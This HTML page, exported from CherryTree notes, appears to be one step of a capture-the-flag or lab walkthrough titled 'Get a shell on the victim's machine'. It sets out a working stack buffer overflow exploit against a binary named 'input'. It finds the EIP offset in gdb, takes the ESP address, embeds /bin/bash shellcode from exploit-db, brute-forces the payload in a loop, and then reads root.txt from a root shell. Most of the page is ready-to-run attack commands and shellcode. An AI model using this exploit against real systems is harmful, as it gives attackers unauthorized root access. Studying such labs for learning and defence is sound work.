<!doctype html><html>
<head>
  <meta http-equiv="content-type" content="text/html; charset=utf-8">
  <title>5.1.4 Get a shell on the victim's machine</title>
  <meta name="generator" content="CherryTree">
  <link rel="stylesheet" href="res/styles3.css" type="text/css" />
  <script></script>
</head>
<body><div class="page"><h1 class="title">5.1.4 Get a shell on the victim's machine</h1><br/>You are using “clapton” user. from point 4.<br /><br />1. Load the binary “input” in “gdb”.<br />    <div class="codebox"><div class="codebox"><span style="color:#6a5acd;font-weight:400">$gdb</span>&nbsp;-q&nbsp;input<br /></div></div><br /><br />2. Get the <a href="https://en.wikipedia.org/wiki/X86#32-bit">EIP</a> value<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;r&nbsp;$<span style="color:#a52a2a;font-weight:700">(</span>python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'print("A"*171&nbsp;+&nbsp;"B"&nbsp;*&nbsp;5&nbsp;+&nbsp;"\x90"*&nbsp;2000&nbsp;)'</span><span style="color:#a52a2a;font-weight:700">)</span><br /><br /></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/887-1.png" alt="images/887-1.png" /><br /><br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">(</span>gdb<span style="color:#a52a2a;font-weight:700">)</span>&nbsp;&nbsp;x<span style="color:#a52a2a;font-weight:700">/</span>s&nbsp;<span style="color:#6a5acd;font-weight:400">$esp</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/887-2.png" alt="images/887-2.png" /><br /><br />    <strong>ESP</strong> <code>\x10\xce\x9a\xbf</code><br /><br />3.  “bash” shell code with our malicious code from <a href="https://www.exploit-db.com/shellcodes/13697">https://www.exploit-db.com/shellcodes/13697</a>.<br />  <br /><strong>   BASH SHELL CODE  </strong><strong><code>"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"</code></strong><br /><br />4. Exit from “gdb” (q).<br /><br />5. Run this code on the shell.<br />    <div class="codebox"><div class="codebox"><span style="color:#a52a2a;font-weight:700">for</span>&nbsp;<span style="color:#6a5acd;font-weight:400">i</span>&nbsp;<span style="color:#a52a2a;font-weight:700">in</span>&nbsp;<span style="color:#a52a2a;font-weight:700">{</span>1..10000<span style="color:#a52a2a;font-weight:700">};</span>&nbsp;<span style="color:#a52a2a;font-weight:700">do</span>&nbsp;<span style="color:#a52a2a;font-weight:700">(</span>.<span style="color:#a52a2a;font-weight:700">/</span>input&nbsp;$<span style="color:#a52a2a;font-weight:700">(</span>python&nbsp;-c&nbsp;<span style="color:#ff00ff;font-weight:400">'print&nbsp;"A"&nbsp;*&nbsp;171&nbsp;+&nbsp;"\x10\xce\x9a\xbf"&nbsp;+&nbsp;"\x90"&nbsp;*&nbsp;2000&nbsp;+&nbsp;"\x6a\x0b\x58\x99\x52\x66\x68\x2d\x70\x89\xe1\x52\x6a\x68\x68\x2f\x62\x61\x73\x68\x2f\x62\x69\x6e\x89\xe3\x52\x51\x53\x89\xe1\xcd\x80"'</span><span style="color:#a52a2a;font-weight:700">));</span>&nbsp;<span style="color:#a52a2a;font-weight:700">done</span></div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/887-3.png" alt="images/887-3.png" /><br /><br />6. Run the following code.<br />    <div class="codebox"><div class="codebox">bash-4.3#&nbsp;<span style="color:#a52a2a;font-weight:700">cd</span>&nbsp;<span style="color:#a52a2a;font-weight:700">/</span>root<br />bash-4.3#&nbsp;<span style="color:#a52a2a;font-weight:700">ls</span><br />bash-4.3#&nbsp;<span style="color:#a52a2a;font-weight:700">cat</span>&nbsp;root.txt</div></div><br /><br />	<span style="color:#ffa500;">Output:</span> <br />    <img src="images/887-4.png" alt="images/887-4.png" /><br /><p align="center"><img src="images/home.png" height="22" width="22">  <a href="index.html">Index</a></p></div></body></html>